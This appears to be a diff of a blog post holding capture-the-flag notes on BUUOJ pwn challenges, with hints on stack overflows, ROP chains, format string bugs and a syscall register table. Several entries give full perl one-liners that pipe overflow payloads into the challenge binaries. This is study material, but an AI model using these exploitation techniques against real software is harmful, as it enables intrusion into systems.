@@ -19,36 +19,42 @@ date:   2020-08-26 22:15:38 +0800
    1. arch, stripped?
 2. checksec
 
+## Terminology
+
+### [System call](https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls)
+
+- x86:
+  - system call via interrupt: `int 80`, `ebx, ecx, edx, esi, edi, ebp` with `eax` filled with system call number
+- x86_64 with `rax` filled with system call number 
+  - user call: `rdi, rsi, rdx, rcx, r8, r9`
+  - system call: `rdi, rsi, rdx, r10, r8, r9`
+
 ## Problems
 
 1. test_your_nc 
    1. ida system("/bin/sh");
    2. `perl -e 'print "ls\ncat flag\n"' | test_your_nc`
-2. rip
+2. [**RA**] rip
    1. `system("/bin/sh")` found
    2. segfault??? _TODO_
-3. warmup_csaw_2016
-   1. amd64, C `gets` and `system("cat flag.txt")` found
-   2. overwrite return address
-   3. `perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016`
-4. pwn1_sctf_2016
-   1. x86, C `gets` and `'system("cat flag.txt")'` found
-   2. overwrite return address
-   3. `std::string`: the source replaces any appearance of `I` with `you` in string input
-   4. `perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1`
-5. ciscn_2019_n_1
+3. [**RA**] warmup_csaw_2016
+   1. `system("cat flag.txt")` found
+   2. `perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016`
+4. [**RA**] pwn1_sctf_2016
+   1. `'system("cat flag.txt")'` found
+   2. `perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1`
+5. [**RA**] ciscn_2019_n_1
    1. `perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | ./ciscn_2019_n_1`
-6. [**post**]({{ site.url }}/2020/07/14/buuoj-pwn-ciscn_2019_c_1.html) ciscn_2019_c_1
+6. [**ROP**]({{ site.url }}/2020/07/14/buuoj-pwn-ciscn_2019_c_1.html) ciscn_2019_c_1
 7. [**ROP**]({{ site.url }}/assets/OGeek2019_babyrop.py) [OGeek2019]babyrop
-   1. Bypass: `strncmp(a, b, 0)` always returns 0
+   1. Flaw: `strncmp(a, b, 0)` always returns 0
 8. ciscn_2019_en_2: the same as [ciscn_2019_c_1]({{ site.url }}/2020/07/14/buuoj-pwn-ciscn_2019_c_1.html)
 9. [**ROP**]({{ site.url }}/assets/get_started_3dsctf_2016.py) get_started_3dsctf_2016:
-   1. Peaceful exit ?
-10. [**ROP**]({{ site.url }}/assets/5space_pwn5.py) [第五空间2019 决赛]PWN5:
-   1. [**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
+   1.  Peaceful exit ?
+10. [**ROP**]({{ site.url }}/assets/5space_pwn5.py) [第五空间2019 决赛]PWN5: [**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
 11. [**ROP**]({{ site.url }}/assets/jarvisoj_level0.py) jarvisoj_level0
 12. [**ROP**]({{ site.url }}/assets/r2t3.py) [BJDCTF 2nd]r2t3:
-    1. Bypass: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
+    1. Flaw: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
 13. [**ROP**]({{ site.url }}/assets/ciscn_2019_n_8.py) ciscn_2019_n_8
 14. [**ROP**]({{ site.url }}/assets/not_the_same_3dsctf_2016.py) not_the_same_3dsctf_2016
     1. Or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
@@ -61,5 +67,9 @@ date:   2020-08-26 22:15:38 +0800
 19. [**ROP**]({{ site.url }}/assets/ciscn_2019_s_3.py) [ciscn_2019_s_3](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
     1.  Construct `"/bin/sh"` on stack
     2.  ROP via `__libc_csu_init()`
-    3.  [x86_86 `syscall`](https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls)
-    4.  Or, [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
+    3.  Or, [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
+20. [**ROP**]({{ site.url }}/assets/HarekazeCTF2019_baby_rop_2.py) [HarekazeCTF2019]babyrop2
+    1.  Leaked address of `printf()` ends with `"\x00"` and outputs nothing
+    2.  Construct `"/bin/sh"` and ROP chain in .bss segment
+21. [**ROP**]({{ site.url }}/assets/pwn2_sctf_2016.py) [pwn2_sctf_2016]pwn2_sctf_2016
+    1.  Flaw: only check if length <=0x20
